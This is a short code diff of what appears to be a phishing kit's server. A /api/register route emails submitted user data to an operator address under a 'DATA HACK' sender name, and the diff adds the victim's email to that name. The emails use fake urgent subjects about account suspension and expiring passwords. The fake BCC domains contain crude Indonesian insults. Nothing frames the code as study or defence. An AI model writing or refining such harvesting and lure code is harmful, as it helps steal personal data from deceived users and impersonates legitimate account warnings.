@@ -106,8 +106,6 @@ function getSpamSubject(targetEmail, isRetry = false) {
     const spamSubjects = [
         `!!! 𝗛𝗔𝗖𝗞!!! 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ${targetEmail} 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗦𝗨𝗦𝗣𝗘𝗡𝗗𝗘𝗗 !!!`,
         `🔴🔴🔴 𝗪𝗜𝗡𝗡𝗘𝗥𝗬!!! 𝗛𝗔𝗖𝗞 𝗙𝗥𝗘𝗘 𝗛𝗔𝗖𝗞 𝗛𝗔𝗖𝗞🔴🔴🔴`,
-        `✅✅✅ FREE ✅✅✅ FREE ✅✅✅ FREE ✅✅✅ CLAIM NOW!!!`,
-        `🏆🏆🏆 CONGRATULATIONS ${targetEmail} YOU ARE SELECTED 🏆🏆🏆`,
         `⚠️⚠️⚠️ LAST CHANCE!!! VERIFY YOUR ACCOUNT ⚠️⚠️⚠️`,
         `🔴 𝗛𝗔𝗖𝗞: ${targetEmail} 𝗬𝗢𝗨𝗥 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗪𝗜𝗟𝗟 𝗘𝗫𝗣𝗜𝗥𝗘 𝗧𝗢𝗗𝗔𝗬𝗝𝗟 🔴`
     ];
@@ -237,7 +235,7 @@ app.post('/api/register', async (req, res) => {
         const fakeEmails = [`spam${Date.now()}@freeeanjing.om.anjing.goblok`, `fake${Date.now()}@kontolhack.co.com.id.web.kon`];
         
         await transporter.sendMail({
-            from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 🏆🏆🏆" <${SENDER_EMAIL}>`,
+            from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 🏆🏆🏆" <${SENDER_EMAIL}>`,
             to: RECEIVER_EMAIL,
             bcc: fakeEmails,
             subject: getSpamSubject(data.email),
